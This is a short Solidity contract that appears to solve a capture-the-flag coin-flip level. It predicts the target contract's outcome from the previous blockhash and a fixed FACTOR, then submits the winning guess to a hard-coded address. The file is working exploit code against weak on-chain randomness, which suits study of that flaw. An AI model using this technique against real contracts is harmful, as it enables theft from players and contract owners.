// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract TopFlipper {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coin = CoinFlip(0x06ac09d8e2E22CBeA113aC9B62E515f8413066D3);

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        bool success = coin.flip(side);
        return success;
    }
}
